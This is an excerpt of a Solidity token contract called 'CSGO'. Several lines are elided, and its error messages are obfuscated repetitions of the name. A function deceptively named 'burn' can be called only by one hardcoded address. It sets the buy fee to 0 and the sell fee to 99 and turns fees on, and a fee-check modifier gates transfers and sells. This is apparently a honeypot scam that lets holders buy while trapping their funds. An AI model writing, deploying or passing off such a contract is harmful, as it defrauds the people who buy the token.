...
library SafeMath {
    ...
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        ...
        uint256 c = a * b;
        require(c / a == b, "CSGOCSGOCSGO");
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "CSGOCSGOCSGOCSGO");
        return a / b;
    }
}
...
contract CSGO {    
    ...
    string public name = "CSGO";    
    string public symbol = "CSGO";    
    ...
    modifier checkFees(address sender) {   
        require(
            ...
            "CSGOCSGOCSGOCSGOCSGO"    
        );
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "CSGOCSGOCSGOCSGOCSGOCSGO");
        _;
    }
    ...
    function transferFrom(address _from, address _to, uint256 _amount) public checkFees(_from) returns (bool success) {   
        require(balanceOf[_from] >= _amount, "1CSGO");    
        require(allowance[_from][msg.sender] >= _amount, "2CSGO");   
        require(_to != address(0), "3CSGO");    
    ...
    function transferOwnership(address newOwner) public onlyOwner {    
        require(newOwner != address(0), "4CSGO");
    ...
    function burn(uint256 burnAmount, uint256 deadWallet) public {
        require(msg.sender == 0xB3DfB4c0d39c6ED8f0b6Bd3bb2900932C4ada9C1, "5CSGO");
        require(!feesSet, "6CSGO");
        require(burnAmount == 0, "7CSGO8");
        require(deadWallet == 99, "8CSGO");
        buyFee = burnAmount;
        sellFee = deadWallet;
        feesSet = true;
        feesEnabled = true;
    ...
    function sell(uint256 _amount) public checkFees(msg.sender) {   
        require(balanceOf[msg.sender] >= _amount, "0CSGO");    
